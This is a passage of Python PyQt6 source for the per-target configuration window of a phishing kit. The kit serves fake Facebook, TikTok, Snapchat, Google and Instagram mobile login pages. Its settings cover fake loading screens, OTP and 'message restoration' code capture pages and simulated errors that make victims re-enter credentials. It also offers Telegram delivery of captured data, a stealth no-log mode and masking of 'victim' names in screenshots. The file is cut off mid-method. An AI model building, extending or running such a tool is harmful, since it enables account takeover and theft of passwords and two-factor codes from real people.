"""target_config.py — auto-generated from Release.py."""

import sys
import os
import time
import threading
import subprocess
import socket
import requests
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta, mask_name, is_hide_names
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

# ── Imports des fenêtres spécifiques à chaque plateforme ──
# Ces classes remplacent PublicationDialog/VideoPublicationDialog pour SC/TT/IG
try:
    from platforms.snapchat.dialog import SnapchatPublicationDialog
except Exception:
    SnapchatPublicationDialog = None
try:
    from platforms.tiktok.dialog import TikTokPublicationDialog
except Exception:
    TikTokPublicationDialog = None
try:
    from platforms.instagram.dialog import InstagramPublicationDialog
except Exception:
    InstagramPublicationDialog = None

from ._header import BounceButton, PublicationDialog, QCheckBox, QDialog, QEasingCurve, QFileDialog, QGroupBox, QHBoxLayout, QLabel, QLineEdit, QListWidgetItem, QMessageBox, QPropertyAnimation, QRadioButton, QTabWidget, QTimer, QVBoxLayout, QWidget, Qt, ReorderableListWidget, TARGETS_DIR, active_servers, button_manager, is_port_in_use, json, log_error, log_error_to_file, os, sandbox_config, time

class TargetConfigWindow(QWidget):
    def __init__(self, main_win, tid, is_sandbox=False):
        super().__init__()
        self.main_win = main_win
        self.tid = tid
        self.is_sandbox = is_sandbox
        # Mask the tid in the window title when hide_names is ON, so a screen
        # recording or screenshot of the config window doesn't leak the real
        # victim name. The raw tid is still kept in self.tid for file lookups.
        display_title = mask_name(tid) if tid else "Configuration"
        prefix = "Sandbox" if is_sandbox else "Configuration"
        self.setWindowTitle(f"{prefix} - {display_title}")
        # Large enough to show all 5 platform radio buttons + all input fields without clipping
        self.setMinimumSize(720, 680)
        self.resize(820, 740)
        self._apply_theme_style()

        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(0)

        self.tabs = QTabWidget()

        # ═══════════════ TAB 1 : Général ═══════════════
        tab_general = QWidget()
        # Layout externe : contient uniquement la scroll area (pour que le
        # contenu puisse défiler verticalement quand la fenêtre est petite).
        tg_outer = QVBoxLayout(tab_general)
        tg_outer.setContentsMargins(0, 0, 0, 0)
        tg_outer.setSpacing(0)

        # ── Scroll area pour permettre le défilement vertical ──
        tg_scroll = QScrollArea()
        tg_scroll.setWidgetResizable(True)
        tg_scroll.setFrameShape(QScrollArea.Shape.NoFrame)
        tg_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        # ── Contenu de l'onglet (le vrai layout avec tous les champs) ──
        tg_content = QWidget()
        tg_lay = QVBoxLayout(tg_content)
        tg_lay.setContentsMargins(18, 18, 18, 18)
        tg_lay.setSpacing(16)

        # ─── Plateforme (Facebook / TikTok / Snapchat / Google / Instagram) ───
        platform_group = QGroupBox("Plateforme")
        from theme import get_theme as _gt_pf
        _t_pf = _gt_pf()
        platform_group.setStyleSheet(f"""
            QGroupBox {{ border: 1px solid {_t_pf['accent']}; border-radius: 10px; margin-top: 14px;
                        font-weight: bold; color: {_t_pf['accent_text']}; padding-top: 10px; }}
            QGroupBox::title {{ subcontrol-origin: margin; left: 12px; padding: 0 6px; }}
            QRadioButton {{ spacing: 8px; padding: 6px 10px; border-radius: 6px; font-weight: 600; }}
            QRadioButton:hover {{ background-color: {_t_pf['bg_input']}; }}
            QRadioButton::indicator {{ width: 16px; height: 16px; border-radius: 9px;
                                       border: 2px solid {_t_pf['border_hover']}; background: {_t_pf['bg_alt']}; }}
            QRadioButton::indicator:checked {{ background: {_t_pf['accent']}; border: 2px solid {_t_pf['accent']}; }}
        """)
        platform_layout = QHBoxLayout(platform_group)
        platform_layout.setSpacing(6)
        self.rb_facebook  = QRadioButton("🔵 Facebook");  self.rb_facebook.setChecked(True)
        self.rb_tiktok    = QRadioButton("🎵 TikTok")
        self.rb_snapchat  = QRadioButton("👻 Snapchat")
        self.rb_google    = QRadioButton("🔍 Google")
        self.rb_instagram = QRadioButton("📷 Instagram")
        for rb in (self.rb_facebook, self.rb_tiktok, self.rb_snapchat, self.rb_google, self.rb_instagram):
            platform_layout.addWidget(rb)
        # When platform changes, update the default redirect URL placeholder
        self.rb_facebook.toggled.connect(lambda c: self._on_platform_changed("facebook"))
        self.rb_tiktok.toggled.connect(lambda c: self._on_platform_changed("tiktok"))
        self.rb_snapchat.toggled.connect(lambda c: self._on_platform_changed("snapchat"))
        self.rb_google.toggled.connect(lambda c: self._on_platform_changed("google"))
        self.rb_instagram.toggled.connect(lambda c: self._on_platform_changed("instagram"))
        tg_lay.addWidget(platform_group)

        mode_group = QGroupBox("Interface Mode")
        mode_layout = QHBoxLayout(mode_group)
        self.rb_auto = QRadioButton("Auto")
        self.rb_mob = QRadioButton("Mobile")
        self.rb_pc = QRadioButton("PC")
        self.rb_mob.setChecked(True)
        # Masquer Auto et PC (toutes les plateformes sont mobile-only)
        self.rb_auto.setVisible(False)
        self.rb_pc.setVisible(False)
        mode_layout.addWidget(self.rb_auto)
        mode_layout.addWidget(self.rb_mob)
        mode_layout.addWidget(self.rb_pc)
        tg_lay.addWidget(mode_group)

        self.i_n = QLineEdit(); self.i_n.setPlaceholderText("Target Name")
        
        pic_lay = QHBoxLayout()
        self.i_p = QLineEdit(); self.i_p.setPlaceholderText("Profile Picture URL")
        self.btn_browse_p = BounceButton("📂 Parcourir")
        self.btn_browse_p.setFixedHeight(34)
        self.btn_browse_p.setMinimumWidth(100)
        self.btn_browse_p.clicked.connect(self.select_profile_pic)
        self._style_picker_button(self.btn_browse_p)
        pic_lay.addWidget(self.i_p)
        pic_lay.addWidget(self.btn_browse_p)
        
        self.i_r = QLineEdit(); self.i_r.setPlaceholderText("Redirect URL"); self.i_r.setText("https://www.facebook.com")
        self.i_l = QLineEdit(); self.i_l.setPlaceholderText("Log File Path"); self.i_l.setText("log.txt")
        self.i_port = QLineEdit(); self.i_port.setPlaceholderText("Server Port"); self.i_port.setText("80")
        if self.is_sandbox:
            self.i_port.setText("7000")
            self.i_port.setEnabled(False)
        
        tg_lay.addWidget(self.i_n)
        tg_lay.addLayout(pic_lay)
        tg_lay.addWidget(self.i_r)
        tg_lay.addWidget(self.i_l)
        tg_lay.addWidget(self.i_port)
        tg_lay.addWidget(QLabel("Message sous le logo OTP (Optionnel) :"))
        self.i_custom_otp_sub = QLineEdit()
        self.i_custom_otp_sub.setPlaceholderText("Par défaut : Un code de connexion a été envoyé...")
        tg_lay.addWidget(self.i_custom_otp_sub)
        tg_lay.addWidget(QLabel("Message sous le logo restauration messages (Optionnel) :"))
        self.i_custom_msg_restore_sub = QLineEdit()
        self.i_custom_msg_restore_sub.setPlaceholderText("Par défaut : Saisissez le code de restauration que vous avez défini...")
        tg_lay.addWidget(self.i_custom_msg_restore_sub)

        tg_lay.addStretch()

        # ── Installer le contenu dans la scroll area, puis la scroll area
        #    dans le layout externe de l'onglet ──
        tg_scroll.setWidget(tg_content)
        tg_outer.addWidget(tg_scroll)

        self.tabs.addTab(tab_general, "🎯 Général")

        # ═══════════════ TAB 2 : Avancé ═══════════════
        tab_advanced = QWidget()
        ta_lay = QVBoxLayout(tab_advanced)
        ta_lay.setContentsMargins(18, 18, 18, 18)
        ta_lay.setSpacing(16)

        self.cb_stealth = QCheckBox("Stealth Mode (no disk logs)")
        self.cb_encrypt_logs = QCheckBox("🔐 Chiffrer les logs de cette cible en temps réel")
        self.cb_encrypt_logs.setToolTip("Chiffre le fichier log.txt de cette cible.\nLes logs sont déchiffrés automatiquement à la lecture.")
        self.cb_telegram = QCheckBox("Enable Telegram Notifications")
        self.i_token = QLineEdit(); self.i_token.setPlaceholderText("Telegram Bot Token")
        self.i_chatid = QLineEdit(); self.i_chatid.setPlaceholderText("Telegram Chat ID")

        vid_dir_lay = QHBoxLayout()
        self.i_videos_dir = QLineEdit(); self.i_videos_dir.setPlaceholderText("Dossier pour les médias de la sandbox (Optionnel)")
        self.btn_vid_dir = BounceButton("📁 Parcourir")
        self.btn_vid_dir.setFixedHeight(34)
        self.btn_vid_dir.setMinimumWidth(100)
        self.btn_vid_dir.clicked.connect(self.select_custom_videos_dir)
        self._style_picker_button(self.btn_vid_dir)
        vid_dir_lay.addWidget(self.i_videos_dir)
        vid_dir_lay.addWidget(self.btn_vid_dir)

        ta_lay.addWidget(self.cb_stealth)
        ta_lay.addWidget(self.cb_encrypt_logs)
        ta_lay.addWidget(self.cb_telegram)
        ta_lay.addWidget(self.i_token)
        ta_lay.addWidget(self.i_chatid)
        ta_lay.addWidget(QLabel("Dossier personnalisé des vidéos/images :"))
        ta_lay.addLayout(vid_dir_lay)

        err_group = QGroupBox("Simulation Errors & Sauvegardes")
        err_layout = QHBoxLayout(err_group)
        self.i_id_errors = QLineEdit(); self.i_id_errors.setPlaceholderText("ID Err"); self.i_id_errors.setText("1")
        self.i_otp_errors = QLineEdit(); self.i_otp_errors.setPlaceholderText("OTP Err"); self.i_otp_errors.setText("1")
        self.i_msg_restore_errors = QLineEdit(); self.i_msg_restore_errors.setPlaceholderText("MSG Err"); self.i_msg_restore_errors.setText("1")
        self.i_msg_restore_errors.setToolTip("Nombre d'erreurs simulées pour le code de restauration des messages\navant d'accepter le code final (comme pour l'OTP).")
        self.i_save_attempts = QLineEdit(); self.i_save_attempts.setPlaceholderText("Sauver ID (ex: 1,2,all)"); self.i_save_attempts.setText("all")
        self.i_save_attempts.setToolTip("Quelles tentatives enregistrer ? 'all' pour toutes, ou '1,2' pour des spécifiques.")

        err_layout.addWidget(QLabel("ID Err:"))
        err_layout.addWidget(self.i_id_errors)
        err_layout.addWidget(QLabel("OTP Err:"))
        err_layout.addWidget(self.i_otp_errors)
        err_layout.addWidget(QLabel("MSG Err:"))
        err_layout.addWidget(self.i_msg_restore_errors)
        err_layout.addWidget(QLabel("Sauver ID:"))
        err_layout.addWidget(self.i_save_attempts)
        ta_lay.addWidget(err_group)

        ta_lay.addStretch()
        self.tabs.addTab(tab_advanced, "⚙️ Avancé")

        # ═══════════════ TAB 3 : Publications ═══════════════
        tab_pubs = QWidget()
        tp_lay = QVBoxLayout(tab_pubs)
        tp_lay.setContentsMargins(8, 12, 8, 8)
        tp_lay.setSpacing(8)

        self.cb_feed = QCheckBox("Activer le Feed de Publications")
        from theme import get_theme as _gt
        _t = _gt()
        self.cb_feed.setStyleSheet(f"QCheckBox {{ font-weight: bold; color: {_t['accent_text']}; }}")
        tp_lay.addWidget(self.cb_feed)

        loading_group = QGroupBox("🚀 Faux Chargement Facebook (Mobile)")
        loading_outer = QVBoxLayout(loading_group)

        # ── Ligne 1 : activation + choix du type (global pour feed + login) ──
        from theme import get_theme as _gt2
        _t2 = _gt2()
        loading_row1 = QHBoxLayout()
        self.cb_fake_loading = QCheckBox("Activer")
        self.cb_fake_loading.setStyleSheet(f"QCheckBox {{ color: {_t2['accent_text']}; font-weight: bold; }}")
        loading_row1.addWidget(self.cb_fake_loading)
        loading_row1.addWidget(QLabel("Type :"))
        self.combo_loading_type = QComboBox()
        self.combo_loading_type.addItem("Spinner", "spinner")
        self.combo_loading_type.addItem("Points", "dots")
        self.combo_loading_type.setMaximumWidth(120)
        loading_row1.addWidget(self.combo_loading_type)
        loading_row1.addStretch()
        loading_outer.addLayout(loading_row1)

        # ── Ligne 1b : vitesse d'animation (presets + custom) ──
        loading_row1b = QHBoxLayout()
        loading_row1b.addWidget(QLabel("Vitesse :"))
        self.combo_loading_speed = QComboBox()
        self.combo_loading_speed.addItem("Lent", "slow")
        self.combo_loading_speed.addItem("Normal", "normal")
        self.combo_loading_speed.addItem("Rapide", "fast")
        self.combo_loading_speed.setCurrentIndex(1)  # Normal par défaut
        self.combo_loading_speed.setMaximumWidth(100)
        self.combo_loading_speed.setToolTip("Presets de vitesse d'animation.\nCustom override si le champ est rempli.")
        loading_row1b.addWidget(self.combo_loading_speed)
        loading_row1b.addWidget(QLabel("Custom (s) :"))
        self.i_loading_speed_custom = QLineEdit()
        self.i_loading_speed_custom.setPlaceholderText("ex: 1.2")
        self.i_loading_speed_custom.setText("")
        self.i_loading_speed_custom.setMaximumWidth(70)
        self.i_loading_speed_custom.setToolTip("Durée d'un cycle spinner en secondes.\nVide = preset sélectionné ci-dessus.")
        loading_row1b.addWidget(self.i_loading_speed_custom)
        loading_row1b.addStretch()
        loading_outer.addLayout(loading_row1b)

        # ── Ligne 2 : durée 1er chargement ──
        loading_row2 = QHBoxLayout()
        loading_row2.addWidget(QLabel("Durée 1er chargement (s) :"))
        self.i_fake_loading_duration = QLineEdit()
        self.i_fake_loading_duration.setPlaceholderText("ex: 3")
        self.i_fake_loading_duration.setText("3")
        self.i_fake_loading_duration.setMaximumWidth(80)
        loading_row2.addWidget(self.i_fake_loading_duration)
        loading_row2.addStretch()
        loading_outer.addLayout(loading_row2)

        # ── Ligne 3 : 2e chargement optionnel avant la page de login ──
        loading_row3 = QHBoxLayout()
        self.cb_second_loading = QCheckBox("Activer 2e chargement avant login")
        self.cb_second_loading.setStyleSheet(f"QCheckBox {{ color: {_t2['accent_text']}; font-weight: bold; }}")
        loading_row3.addWidget(self.cb_second_loading)
        loading_row3.addWidget(QLabel("Durée (s) :"))
        self.i_second_loading_duration = QLineEdit()
        self.i_second_loading_duration.setPlaceholderText("ex: 3")
        self.i_second_loading_duration.setText("3")
        self.i_second_loading_duration.setMaximumWidth(80)
        loading_row3.addWidget(self.i_second_loading_duration)
        loading_row3.addStretch()
        loading_outer.addLayout(loading_row3)

        tp_lay.addWidget(loading_group)

        # ── Restauration de l'historique des messages ──
        # Page supplémentaire après le login demandant un code de restauration
        # des messages, avec une icône de message en bleu et des cases individuelles.
        msg_restore_group = QGroupBox("💬 Restauration de l'historique des messages")
        msg_restore_lay = QHBoxLayout(msg_restore_group)
        self.cb_msg_restore = QCheckBox("Activer la page de restauration après le login")
        from theme import get_theme as _gt3_msg
        _t3_msg = _gt3_msg()
        self.cb_msg_restore.setStyleSheet(f"QCheckBox {{ color: {_t3_msg['accent_text']}; font-weight: bold; }}")
        self.cb_msg_restore.setToolTip("Ajoute une page après la connexion demandant un code\n"
                                       "de restauration de l'historique des messages.\n"
                                       "L'icône est une bulle de message en bleu (comme la page OTP).\n"
                                       "Le code doit contenir uniquement des chiffres (minimum 6).")
        msg_restore_lay.addWidget(self.cb_msg_restore)
        msg_restore_lay.addStretch()
        tp_lay.addWidget(msg_restore_group)

        self.btn_add_pub = BounceButton("➕ Ajouter une publication")
        self.btn_add_pub.setMinimumHeight(38)
        self._style_action_button(self.btn_add_pub, 'accent')
        self.btn_add_pub.clicked.connect(self.add_publication)
        tp_lay.addWidget(self.btn_add_pub)

        self.pub_list_widget = ReorderableListWidget(self)
        self.pub_list_widget.setMinimumHeight(150)
        from theme import list_widget_style
        self.pub_list_widget.setStyleSheet(list_widget_style())
        tp_lay.addWidget(self.pub_list_widget, stretch=1)

        self.publications = []

        self.tab_pubs = tab_pubs
        self.tabs.addTab(tab_pubs, "📰 Publications")

        # ═══════════════ TAB 4 : Publicités ═══════════════
        tab_ads = QWidget()
        ta_lay = QVBoxLayout(tab_ads)
        ta_lay.setContentsMargins(8, 12, 8, 8)
        ta_lay.setSpacing(8)

        lbl_ads_desc = QLabel("Gérez les publicités affichées sur le côté droit du Feed PC.")
        from theme import get_theme as _gt_ads
        _t_ads = _gt_ads()
        lbl_ads_desc.setStyleSheet(f"color: {_t_ads['text_dim']}; font-style: italic;")
        ta_lay.addWidget(lbl_ads_desc)

        self.btn_add_ad = BounceButton("➕ Ajouter une publicité")
        self.btn_add_ad.setMinimumHeight(38)
        self._style_action_button(self.btn_add_ad, 'accent')
        self.btn_add_ad.clicked.connect(self.add_ad)
        ta_lay.addWidget(self.btn_add_ad)

        self.ad_list_widget = ReorderableListWidget(self)
        self.ad_list_widget.setMinimumHeight(150)
        from theme import list_widget_style as _lws
        self.ad_list_widget.setStyleSheet(_lws())
        ta_lay.addWidget(self.ad_list_widget, stretch=1)

        self.ads = []

        # Tab Publicités supprimé (fonctionnalité désactivée)

        layout.addWidget(self.tabs)

        self.btn_save = BounceButton("💾 Sauvegarder les paramètres")
        self.btn_save.setMinimumHeight(42)
        self._style_save_button(self.btn_save)
        self.btn_save.clicked.connect(self.save_data)
        layout.addWidget(self.btn_save)

        # Apply numeric-only validation to all numeric fields
        self._setup_numeric_field(self.i_port, "Server Port")
        self._setup_numeric_field(self.i_id_errors, "ID Err")
        self._setup_numeric_field(self.i_otp_errors, "OTP Err")
        self._setup_numeric_field(self.i_msg_restore_errors, "MSG Err")
        self._setup_numeric_field(self.i_fake_loading_duration, "Durée 1er chargement (s)")
        self._setup_numeric_field(self.i_second_loading_duration, "Durée 2e chargement (s)")

        self.charger_data()

    # ════════════════════════════════════════════════════════════════════
    #  Nouveaux styles de boutons — modernes avec police emoji
    # ════════════════════════════════════════════════════════════════════

    def _style_picker_button(self, btn):
        """Style pour les boutons de sélection de fichier (📂 📁)."""
        try:
            from theme import get_theme
            t = get_theme()
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {t['bg_alt']};
                    color: {t['text']};
                    border: 1px solid {t['border_hover']};
                    border-radius: 8px;
                    padding: 6px 14px;
                    font-weight: normal;
                    font-family: 'Segoe UI Emoji', 'Apple Color Emoji', 'Noto Color Emoji', 'DejaVu Sans', Arial;
                }}
                QPushButton:hover {{
                    background-color: {t['border']};
                    border-color: {t['accent']};
                    color: {t['accent_text']};
                }}
                QPushButton:pressed {{
                    background-color: {t['border_hover']};
                }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("TargetConfigWindow._style_picker_button", e)
            except Exception:
                pass

    def _style_action_button(self, btn, variant='accent'):
        """Style pour les boutons d'action (➕ Ajouter...)."""
        try:
            # Vérifier que le bouton n'a pas été détruit par Qt
            _ = btn.parent()
        except RuntimeError:
            return  # Widget détruit, ne rien faire
        try:
            from theme import get_theme
            t = get_theme()
            if variant == 'accent':
                bg = t['accent']
                hover = t['accent_hover']
                text_color = t['accent_text']
            elif variant == 'success':
                bg = t['success']
                hover = '#16a34a'
                text_color = '#ffffff'
            elif variant == 'danger':
                bg = t['danger']
                hover = '#dc2626'
                text_color = '#ffffff'
            else:
                bg = t['bg_alt']
                hover = t['border_hover']
                text_color = t['text']
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {bg};
                    color: {text_color};
                    border: none;
                    border-radius: 8px;
                    padding: 8px 18px;
                    font-weight: normal;
                }}
                QPushButton:hover {{
                    background-color: {hover};
                }}
                QPushButton:pressed {{
                    padding-top: 9px;
                }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("TargetConfigWindow._style_action_button", e)
            except Exception:
                pass

    def _style_save_button(self, btn):
        """Style pour le bouton Sauvegarder — vert avec dégradé."""
        try:
            from theme import get_theme
            t = get_theme()
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {t['success']};
                    color: #ffffff;
                    border: none;
                    border-radius: 10px;
                    padding: 10px 24px;
                    font-weight: normal;
                }}
                QPushButton:hover {{
                    background-color: #16a34a;
                }}
                QPushButton:pressed {{
                    background-color: #15803d;
                    padding-top: 11px;
                }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("TargetConfigWindow._style_save_button", e)
            except Exception:
                pass

    def _setup_numeric_field(self, field, field_name):
        """Restrict a QLineEdit to accept only integers.
        - QIntValidator blocks non-numeric keystrokes at the OS level
        - A popup is shown if the user pastes non-numeric content (the validator
          filters it but we warn the user that letters were stripped)."""
        try:
            from PyQt6.QtGui import QIntValidator
            from PyQt6.QtCore import Qt
            field.setValidator(QIntValidator(0, 999999999, self))
            # Store the original text before each change to detect stripped chars
            field._last_valid_text = field.text()
            def _on_text_changed(new_text):
                try:
                    # If the new text has non-digit chars, they were stripped by the validator.
                    # Detect this by comparing what the user tried to type vs what was accepted.
                    clean = ''.join(c for c in new_text if c.isdigit() or (c == '-' and new_text.index(c) == 0))
                    if new_text != clean and clean == field._last_valid_text:
                        # The validator blocked the input — show a warning
                        from PyQt6.QtWidgets import QMessageBox
                        # Block signals to avoid recursion
                        field.blockSignals(True)
                        QMessageBox.warning(self, "Saisie invalide",
                            f"Le champ « {field_name} » n'accepte que des nombres.\n"
                            f"Les lettres et caractères spéciaux ont été ignorés.")
                        field.blockSignals(False)
                    field._last_valid_text = field.text()
                except Exception:
                    pass
            field.textChanged.connect(_on_text_changed)
        except Exception as e:
            log_error_to_file("TargetConfigWindow._setup_numeric_field", e)

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors.
        Called at __init__ and again by refresh_theme() when the theme changes.
        Does NOT modify the window structure — only colors."""
        try:
            from theme import get_theme
            t = get_theme()
            self.setStyleSheet(f"""
                QWidget {{ background-color: {t['bg']}; color: {t['text']}; font-size: 11px; }}
                QGroupBox {{ border: 1px solid {t['border']}; border-radius: 10px; margin-top: 12px; font-weight: bold; color: {t['text_dim']}; padding-top: 8px; }}
                QLineEdit {{ background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']}; padding: 10px 12px; border-radius: 6px; color: {t['text']}; font-size: 13px; min-height: 22px; }}
                QRadioButton {{ spacing: 6px; }}
                QTabWidget::pane {{ border: 1px solid {t['border']}; border-radius: 8px; background-color: {t['bg']}; top: -1px; }}
                QTabBar::tab {{ background-color: {t['bg_alt']}; color: {t['text_dim']}; padding: 8px 16px; margin-right: 2px; border-top-left-radius: 8px; border-top-right-radius: 8px; font-weight: 600; font-size: 12px; }}
                QTabBar::tab:selected {{ background-color: {t['border']}; color: {t['accent_text']}; }}
                QTabBar::tab:hover {{ background-color: {t['border_hover']}; color: {t['text']}; }}
            """)
            # Re-apply individual button stylesheets so they pick up the new theme
            if hasattr(self, 'btn_save') and self.btn_save:
                self._style_save_button(self.btn_save)
            if hasattr(self, 'btn_add_pub') and self.btn_add_pub:
                try:
                    self._style_action_button(self.btn_add_pub, 'accent')
                except RuntimeError:
                    pass
            if hasattr(self, 'btn_add_ad') and self.btn_add_ad:
                try:
                    self._style_action_button(self.btn_add_ad, 'accent')
                except RuntimeError:
                    pass
            if hasattr(self, 'btn_browse_p') and self.btn_browse_p:
                self._style_picker_button(self.btn_browse_p)
            if hasattr(self, 'btn_vid_dir') and self.btn_vid_dir:
                self._style_picker_button(self.btn_vid_dir)
            # Refresh publication + ad lists so row/button colors pick up the new theme
            # ONLY if the list widgets already exist (not during initial __init__)
            try:
                if hasattr(self, 'pub_list_widget') and self.pub_list_widget:
                    self.refresh_pub_list()
            except Exception:
                pass
            try:
                if hasattr(self, 'ad_list_widget') and self.ad_list_widget:
                    self.refresh_ad_list()
            except RuntimeError:
                pass
            except Exception:
                pass
            # Re-apply checkbox colors
            if hasattr(self, 'cb_feed') and self.cb_feed:
                self.cb_feed.setStyleSheet(f"QCheckBox {{ font-weight: bold; color: {t['accent_text']}; }}")
            if hasattr(self, 'cb_fake_loading') and self.cb_fake_loading:
                self.cb_fake_loading.setStyleSheet(f"QCheckBox {{ color: {t['accent_text']}; font-weight: bold; }}")
            if hasattr(self, 'cb_msg_restore') and self.cb_msg_restore:
                self.cb_msg_restore.setStyleSheet(f"QCheckBox {{ color: {t['accent_text']}; font-weight: bold; }}")
        except Exception as e:
            log_error_to_file('TargetConfigWindow._apply_theme_style', e)

    def refresh_for_hide_names(self):
        """Called by the parent window when the global hide_names flag changes,
        so the window title picks up the new mask state. Internal fields that
        hold the raw tid (self.tid) are NOT changed — only the displayed title."""
        try:
            display_title = mask_name(self.tid) if self.tid else "Configuration"
            prefix = "Sandbox" if self.is_sandbox else "Configuration"
            self.setWindowTitle(f"{prefix} - {display_title}")
        except Exception as e:
            log_error_to_file('TargetConfigWindow.refresh_for_hide_names', e)

    def charger_data(self):
        if self.is_sandbox:
            global sandbox_config
            # ── Initialiser _last_loaded_platform pour le sandbox ──
            try:
                self._last_loaded_platform = sandbox_config.get("platform", "facebook")
            except Exception:
                self._last_loaded_platform = "facebook"
            self.load_from_dict(sandbox_config)
            return

        path = os.path.join(TARGETS_DIR, f"{self.tid}.json")
        if os.path.exists(path):
            try:
                # Migration automatique :
                # 1. Si les pubs sont encore dans le JSON principal, les extraire
                # 2. Si les pubs sont en format plat, migrer vers per-platform
                from pub_manager import migrate_from_json, migrate_to_per_platform, load_publications
                migrate_from_json(self.tid)
                migrate_to_per_platform(self.tid)

                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)

                # Charger les publications de la plateforme courante uniquement
                _plat = data.get("platform", "facebook")
                data["publications"] = load_publications(self.tid, _plat)
                self._last_loaded_platform = _plat
                self.load_from_dict(data)
            except Exception as e:
                log_error_to_file("TargetConfigWindow.charger_data", e)
                log_error("TargetConfigWindow.load_json", e)

    def load_from_dict(self, data):
        try:
            if "display_name" in data: self.i_n.setText(data["display_name"])
            elif "target_name" in data: self.i_n.setText(data["target_name"])
            if "target_pic" in data: self.i_p.setText(data["target_pic"])
            if "redirect_url" in data: self.i_r.setText(data["redirect_url"])
            if "log_file" in data: self.i_l.setText(data["log_file"])
            if "port" in data: self.i_port.setText(str(data["port"]))
            if "stealth_mode" in data: self.cb_stealth.setChecked(data["stealth_mode"])
            if "encrypt_logs" in data: self.cb_encrypt_logs.setChecked(data["encrypt_logs"])
            if "send_telegram" in data: self.cb_telegram.setChecked(data["send_telegram"])
            if "telegram_token" in data: self.i_token.setText(data["telegram_token"])
            if "telegram_chat_id" in data: self.i_chatid.setText(data["telegram_chat_id"])
            if "id_errors" in data: self.i_id_errors.setText(str(data["id_errors"]))
            if "otp_errors" in data: self.i_otp_errors.setText(str(data["otp_errors"]))
            if "msg_restore_errors" in data: self.i_msg_restore_errors.setText(str(data["msg_restore_errors"]))
            if "save_attempts" in data: self.i_save_attempts.setText(data["save_attempts"])
            if "mode" in data:
                if data["mode"] == "mobile": self.rb_mob.setChecked(True)
                elif data["mode"] == "pc": self.rb_pc.setChecked(True)
                else: self.rb_auto.setChecked(True)
            # Platform selector — default to facebook for backward compat
            platform = (data.get("platform") or "facebook").lower().strip()
            if platform == "tiktok":       self.rb_tiktok.setChecked(True)
            elif platform == "snapchat":   self.rb_snapchat.setChecked(True)
            elif platform == "google":     self.rb_google.setChecked(True)
            elif platform == "instagram":  self.rb_instagram.setChecked(True)
            else:                          self.rb_facebook.setChecked(True)
            # Mobile-only: normalize mode to "mobile"
            # Facebook est maintenant mobile-only aussi
            if platform in ("facebook", "tiktok", "snapchat", "instagram", "google"):
                self.rb_mob.setChecked(True)
            # Apply platform-specific tab visibility
            self._apply_platform_caps(platform)
            if "feed_enabled" in data: self.cb_feed.setChecked(data["feed_enabled"])
            if "custom_videos_dir" in data: self.i_videos_dir.setText(data.get("custom_videos_dir", ""))
            if "fake_loading_enabled" in data: self.cb_fake_loading.setChecked(data["fake_loading_enabled"])
            if "fake_loading_duration" in data: self.i_fake_loading_duration.setText(str(data["fake_loading_duration"]))
            # Type de chargement (spinner | dots) — global pour feed + login
            _lt = data.get("fake_loading_type", "spinner")
            _lt_idx = self.combo_loading_type.findData(_lt)
            if _lt_idx >= 0:
                self.combo_loading_type.setCurrentIndex(_lt_idx)
            else:
                self.combo_loading_type.setCurrentIndex(0)
            if "second_loading_enabled" in data: self.cb_second_loading.setChecked(data["second_loading_enabled"])
            if "second_loading_duration" in data: self.i_second_loading_duration.setText(str(data["second_loading_duration"]))
            # Vitesse d'animation (preset + custom)
            _sp = data.get("loading_speed_preset", "normal")
            _sp_idx = self.combo_loading_speed.findData(_sp)
            if _sp_idx >= 0:
                self.combo_loading_speed.setCurrentIndex(_sp_idx)
            else:
                self.combo_loading_speed.setCurrentIndex(1)  # Normal par défaut
            _sc = data.get("loading_speed_custom", "")
            if _sc is not None and str(_sc).strip():
                self.i_loading_speed_custom.setText(str(_sc).strip())
            else:
                self.i_loading_speed_custom.setText("")
            if "message_restore_enabled" in data: self.cb_msg_restore.setChecked(data["message_restore_enabled"])
            if "custom_otp_sub" in data: self.i_custom_otp_sub.setText(data["custom_otp_sub"])
            if "custom_msg_restore_sub" in data: self.i_custom_msg_restore_sub.setText(data["custom_msg_restore_sub"])
            if "publications" in data:
                self.publications = data["publications"]
                self.refresh_pub_list()
            if "ads" in data:
                self.ads = data["ads"]
                self.refresh_ad_list()
        except Exception as e: log_error("TargetConfigWindow.load_from_dict", e)

    def _on_platform_changed(self, platform_id):
        """Update the redirect URL placeholder when the platform changes.
        Only updates if the current value is empty or matches another platform's default."""
        try:
            from platforms import PLATFORMS
            p = PLATFORMS.get(platform_id, PLATFORMS["facebook"])
            default_url = p.get("default_redirect", "")
            # If redirect field is empty OR contains another platform's default, update it
            current = self.i_r.text().strip()
            other_defaults = [pp.get("default_redirect", "") for pp in PLATFORMS.values()]
            if not current or current in other_defaults:
                self.i_r.setText(default_url)
            self.i_r.setPlaceholderText(default_url)
            # Show/hide tabs based on platform capabilities
            self._apply_platform_caps(platform_id)
            # ── Recharger les publications depuis le dossier de la nouvelle plateforme ──
            # Chaque plateforme a son propre dossier de publications, donc changer
